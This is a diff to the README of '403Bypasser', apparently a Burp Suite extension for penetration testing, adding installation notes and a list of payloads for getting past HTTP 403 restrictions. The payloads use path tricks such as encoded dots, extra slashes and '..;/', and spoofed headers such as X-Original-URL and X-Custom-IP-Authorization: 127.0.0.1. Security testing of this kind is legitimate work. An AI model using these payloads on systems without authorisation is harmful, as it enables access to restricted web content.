@@ -1,6 +1,24 @@
 # 403Bypasser
 An burpsuite extension to bypass 403 restricted directory. By using PassiveScan (default enabled), each 403 request will be scanned by this extension, so just add to burpsuite and enjoy.
 
+Payloads: 
+$1: HOSTNAME
+$2: PATH
+```
+$1/$2
+$1/%2e/$2
+$1/$2/.
+$1//$2//
+$1/./$2/./
+$1/$2 -H "X-Original-URL: /$2" 
+$1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1" 
+$1/$2 -H "X-Rewrite-URL: /$2"
+$1/$2%20/
+$1/%20$2%20/
+
+$1/$2..;/
+```
+
 ## Installation
 
 `BurpSuite -> Extender -> Extensions -> Add -> Extension Type: Python -> Select file: 403bypasser.py -> Next till Fininsh`
